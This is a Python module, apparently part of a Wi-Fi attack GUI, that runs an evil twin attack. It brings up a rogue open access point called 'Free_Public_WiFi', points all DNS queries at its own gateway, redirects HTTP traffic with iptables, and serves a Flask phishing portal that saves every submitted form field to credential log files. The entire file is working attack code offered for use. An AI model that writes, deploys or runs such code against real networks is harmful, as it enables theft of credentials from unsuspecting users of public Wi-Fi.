# wifi_attack_gui/modules/evil_twin.py
# Evil Twin Attack Module: Launch rogue AP and serve phishing portal
# Requirements: hostapd, dnsmasq, iptables, Flask

import os
import subprocess
import threading
from flask import Flask, request
from datetime import datetime

HOSTAPD_CONF = "/tmp/hostapd.conf"
DNSMASQ_CONF = "/tmp/dnsmasq.conf"
FLASK_PORTAL_FOLDER = "./phishing_portal"
AP_INTERFACE = "wlan0mon"
FAKE_SSID = "Free_Public_WiFi"
GATEWAY_IP = "10.0.0.1"

class EvilTwinAP:
    def __init__(self, interface=AP_INTERFACE, ssid=FAKE_SSID):
        self.interface = interface
        self.ssid = ssid
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.flask_thread = None
        self.flask_app = None
        self.running = False

    def write_hostapd_config(self):
        with open(HOSTAPD_CONF, 'w') as f:
            f.write(f"interface={self.interface}\n")
            f.write("driver=nl80211\n")
            f.write(f"ssid={self.ssid}\n")
            f.write("hw_mode=g\n")
            f.write("channel=6\n")
            f.write("macaddr_acl=0\n")
            f.write("auth_algs=1\n")
            f.write("ignore_broadcast_ssid=0\n")

    def write_dnsmasq_config(self):
        with open(DNSMASQ_CONF, 'w') as f:
            f.write(f"interface={self.interface}\n")
            f.write(f"dhcp-range=10.0.0.10,10.0.0.50,12h\n")
            f.write(f"dhcp-option=3,{GATEWAY_IP}\n")
            f.write(f"dhcp-option=6,8.8.8.8\n")
            f.write(f"address=/#/{GATEWAY_IP}\n")

    def setup_iptables(self):
        subprocess.run(["iptables", "--flush"])
        subprocess.run(["iptables", "-t", "nat", "--flush"])
        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:5000"])
        subprocess.run(["iptables", "-A", "FORWARD", "-j", "ACCEPT"])

    def launch_hostapd(self):
        self.write_hostapd_config()
        self.hostapd_process = subprocess.Popen(["hostapd", HOSTAPD_CONF], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def launch_dnsmasq(self):
        self.write_dnsmasq_config()
        self.dnsmasq_process = subprocess.Popen(["dnsmasq", "-C", DNSMASQ_CONF], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def launch_flask_server(self):
        app = Flask(__name__)
        logs_path = os.path.join(FLASK_PORTAL_FOLDER, "logs")
        os.makedirs(logs_path, exist_ok=True)

        @app.route('/', methods=['GET', 'POST'])
        def portal():
            if request.method == 'POST':
                data = request.form.to_dict()
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                with open(os.path.join(logs_path, f"creds_{timestamp}.txt"), 'w') as f:
                    for k, v in data.items():
                        f.write(f"{k}: {v}\n")
            return open(os.path.join(FLASK_PORTAL_FOLDER, "index.html")).read()

        self.flask_thread = threading.Thread(target=app.run, kwargs={'host':GATEWAY_IP, 'port':5000}, daemon=True)
        self.flask_thread.start()

    def start(self):
        print(f"[+] Launching Evil Twin AP: {self.ssid} on {self.interface}")
        self.running = True
        self.setup_iptables()
        self.launch_hostapd()
        self.launch_dnsmasq()
        self.launch_flask_server()

    def stop(self):
        print("[+] Stopping Evil Twin...")
        self.running = False
        if self.hostapd_process: self.hostapd_process.terminate()
        if self.dnsmasq_process: self.dnsmasq_process.terminate()
        subprocess.run(["iptables", "--flush"])
        subprocess.run(["iptables", "-t", "nat", "--flush"])


if __name__ == '__main__':
    ap = EvilTwinAP()
    try:
        ap.start()
        while True:
            pass  # GUI/monitoring logic will go here
    except KeyboardInterrupt:
        ap.stop()
